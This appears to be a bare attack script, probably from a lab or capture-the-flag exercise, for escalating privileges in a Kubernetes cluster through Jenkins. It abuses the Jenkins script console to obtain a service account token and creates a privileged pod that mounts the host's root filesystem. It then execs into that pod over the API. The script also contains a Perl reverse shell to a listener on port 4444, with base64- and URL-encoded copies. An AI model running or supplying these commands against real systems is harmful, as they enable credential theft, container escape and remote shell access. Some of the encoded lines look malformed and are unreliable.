read -r -d '' POD <<-'EOF'
apiVersion: v1
kind: Pod
metadata:
    name: evil-pod
spec:
    containers:
    - name: evil-container 
      image: ubuntu:latest
      command: ["sleep", "infinity"]
      SecurityContext:
        privileged: true
      volumeMounts:
      - mountPath: /mnt/host
        name: evil-volume
        mountPropagation: Bidirectional
    volumes:
    - name: evil-volume
      hostPath:
        path: /
EOF

#def command = "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
#def proc = command.execute()
#proc.waitFor()
#println "${proc.in.text}"

JENKINS_TOKEN=`curl -d "script=$(<./groovy.id)" -X POST http://10.104.236.89:8080/scriptText`
curl -k -XPOST -H "Content-Type: application/yaml" -H "Authorization: Bearer ${JENKINS_TOKEN}" -d "$POD" https://10.96.0.1:443/api/v1/namespaces/default/pods
curl -k -H "Authorization: Bearer ${JENKINS_TOKEN}" https://10.96.0.1:443/api/v1/namespaces/default/pods/evil-pod
curl -k -H "Authorization: Bearer ${JENKINS_TOKEN}" \
    -H "Connection: Upgrade" \
    -H "Upgrade: websocket" \
    -H "Host: blah.com:80" \
    -H "Origin: http://blah.com:80" \
    -H "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
    -H "Sec-WebSocket-Version: 13" \
    'https://10.96.0.1:443/api/v1/namespaces/default/pods/evil-pod/exec?command=ls&stdin=true&stdout=true&stderr=true&tty=true'


perl -e 'use Socket;$i="10.0.2.15";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
echo perl -e 'use Socket;$i="10.0.2.15";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' | base64
cGVybCAtZSB1c2UgU29ja2V0OyRpPSIxMC4wLjIuMTUiOyRwPTQ0NDQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Cg==
echo "aGV5Cg==" | base64 -d
cGVybCAtZSB1c2UgU29ja2V0OyRpPSIxMC4wLjIuMTUiOyRwPTQ0NDQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI%2bJlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307